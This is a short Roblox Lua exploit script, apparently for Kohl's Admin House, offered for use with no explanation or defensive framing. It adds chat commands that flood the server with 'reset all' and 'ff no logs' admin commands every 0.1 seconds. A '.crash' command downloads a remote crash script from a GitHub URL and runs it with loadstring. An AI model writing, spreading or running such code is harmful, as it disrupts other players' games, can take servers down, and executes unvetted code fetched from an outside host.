spam = false
lspam = false
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    local command = string.lower(msg)
    if command == ".spam" then
        spam = true
        print("Spam is on.")
    end
    if command == ".unspam" then
        spam = false
        print("Spam is off.")
    end
    if command == ".lspam" then
        lspam = true
        print("Log Spam is on.")
    end
    if command == ".unlspam" then
        lspam = false
        print("Log Spam is off.")
    end
    if command == ".crash" then
	loadstring(game:HttpGet("https://github.com/S-PScripts/lua-scripts/blob/main/Kohls%20Admin%20House/Crashes/KAH%20Crash%20Dog.lua",true))()
    end
end)

while true do
	if spam == true then
	   game.Players:Chat("reset all " .. math.random(1,1000))
           wait(0.1)
	end
	if lspam == true then
	   game.Players:Chat("ff no logs " .. math.random(1,1000))
	   wait(0.1)
	end
        if lspam == false and spam == false then
           wait(0.1)
	end
	if lspam == true and spam == true then
	   game.Players:Chat("reset all " .. math.random(1,1000))
	   game.Players:Chat("ff no logs " .. math.random(1,1000))
	   wait(0.1)
	end
end
